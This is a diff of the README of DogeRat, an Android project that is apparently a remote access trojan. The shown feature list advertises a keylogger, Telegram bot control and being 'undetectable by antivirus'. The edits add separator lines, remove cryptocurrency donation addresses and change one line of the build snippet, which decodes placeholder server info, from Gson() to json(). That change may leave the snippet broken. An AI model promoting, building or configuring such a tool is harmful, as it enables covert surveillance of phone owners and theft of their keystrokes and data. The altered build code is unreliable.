@@ -10,7 +10,6 @@
   <img src="https://dogelina.com/dogs/scr.jpg" alt="Logo" />
 </p>
 
-
 ## Features
 - 🔴 Real time
 - 🌐 custom web view
@@ -34,6 +33,8 @@
 - 🔐 Keylogger {Availbe in apk v1 and v2}
 - ✨ Beautiful telegram bot interface
 -🤖 Undetectable by antivirus
+
+  -------------------------
 <h2>Requirements</h2>
 <ul>
   <li><span style="color: #0074D9;">APK EDITOR</span></li>
@@ -132,7 +133,7 @@ To build the application in Android Studio, follow these steps:
 fun getAppData(): AppData {
     val data = "<your encoded server info>"
     val text = decode(data)
-    return Gson().fromJson(text, AppData::class.java)
+    return json().fromJson(text, AppData::class.java)
 }
 ```
 
@@ -189,14 +190,6 @@ fun getAppData(): AppData {
   <a href="https://www.buymeacoffee.com/shivayadav"><img src="https://img.shields.io/badge/-Buy%20me%20a%20coffee-orange?style=for-the-badge&logo=buy-me-a-coffee&logoColor=white" alt="Buy me a coffee"></a>
 </p>
 
-<h2 align="center">Cryptocurrency Donations</h2>
-
-<p align="center">If you prefer to donate using cryptocurrency, you can use the following wallet addresses:</p>
-
-<p align="center">
-  Bitcoin: <code>1LeLwYyDHu51875aenZaNcEnMrEbHwEKJd</code> <br>
-  USDT TRC20: <code>TWX456AoupoYKwCYUKk3ZMWJtNJZRRHnrp</code>
-</p>
 
 
 
@@ -208,6 +201,7 @@ fun getAppData(): AppData {
     <img src="https://reporoster.com/stars/dark/shivaya-dav/DogeRat" alt="Stargazers" title="Stargazers" width="400" height="auto">
   </a>
   
+  -------------------------
   <a href="https://github.com/shivaya-dav/DogeRat/network/members">
     <img src="https://reporoster.com/forks/dark/shivaya-dav/DogeRat" alt="Forkers" title="Forkers" width="400" height="auto">
   </a>
